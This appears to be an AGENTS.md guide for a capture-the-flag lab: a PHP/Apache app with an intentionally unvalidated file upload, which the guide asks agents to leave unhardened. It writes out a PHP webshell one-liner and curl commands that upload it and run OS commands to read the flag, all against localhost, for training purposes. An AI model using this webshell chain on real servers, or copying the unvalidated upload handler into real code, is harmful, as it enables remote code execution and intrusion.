<!-- Parent: ../AGENTS.md -->
<!-- Generated: 2026-07-23 | Updated: 2026-07-23 -->

# FileUpload-Webshell

## Purpose
A PHP/Apache app that lets any visitor upload an arbitrary file to a web-accessible `uploads/` directory with **no validation of file extension, MIME type, or content**. The intended attack is uploading a PHP webshell (e.g. `shell.php` calling `shell_exec($_GET["cmd"])`), then invoking it directly to run OS commands and read `flag.txt` — a classic unrestricted-file-upload-to-RCE chain.

## Key Files
| File | Description |
|------|--------------|
| `index.php` | Serves the upload form (`multipart/form-data` POST to `upload.php`) |
| `upload.php` | Accepts `$_FILES["file"]`, moves it as-is (original filename, no extension/type checks) into `uploads/` via `move_uploaded_file()`, and echoes a link to the uploaded file |
| `Dockerfile` | `php:8.2-apache`; reconfigures Apache to listen on port 8000 (via `sed` on `ports.conf`/`000-default.conf`); creates a `www-data`-owned, world-writable `uploads/` directory; copies `index.php`, `upload.php`, `flag.txt` (flag made read-only, `chmod 444`) |
| `flag.txt` | The challenge flag, readable only via a webshell placed in `uploads/` (or any other RCE) |
| `info.txt` | Korean challenge write-up: goal, difficulty (Easy), and example `shell.php` + `curl` upload/exploit commands |
| `.upload-include` | Files bundled for distribution to trainees (does not include `flag.txt`) |

## For AI Agents

### Working In This Directory
**The complete absence of upload validation (no extension allow/deny-list, no content-type check, no re-encoding) is intentional and is the entire vulnerability being taught.** Do not add extension filtering, MIME validation, upload directory execute-restrictions (e.g. `.htaccess` disabling PHP execution), or any other hardening to `upload.php`/`index.php`/the `Dockerfile` unless explicitly asked — that would defeat the lab.

### Testing Requirements
```bash
cd FileUpload-Webshell
docker build -t fileupload-webshell .
docker run -p 8000:8000 fileupload-webshell
```
Verify the intended exploit chain still works:
```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
curl -F 'file=@shell.php' http://localhost:8000/upload.php
curl "http://localhost:8000/uploads/shell.php?cmd=cat%20../flag.txt"
```

### Common Patterns
- Classic two-file PHP pattern: static HTML form (`index.php`) posting to a minimal, unvalidated upload handler (`upload.php`).
- Apache is retargeted from port 80 to 8000 at image-build time via `sed`, rather than app-level config — keep that in mind if editing the `Dockerfile`.

## Dependencies

### Internal
None — fully self-contained.

### External
- Base image `php:8.2-apache` (system Apache + PHP, no Composer/PHP package dependencies).

<!-- MANUAL: Any manually added notes below this line are preserved on regeneration -->
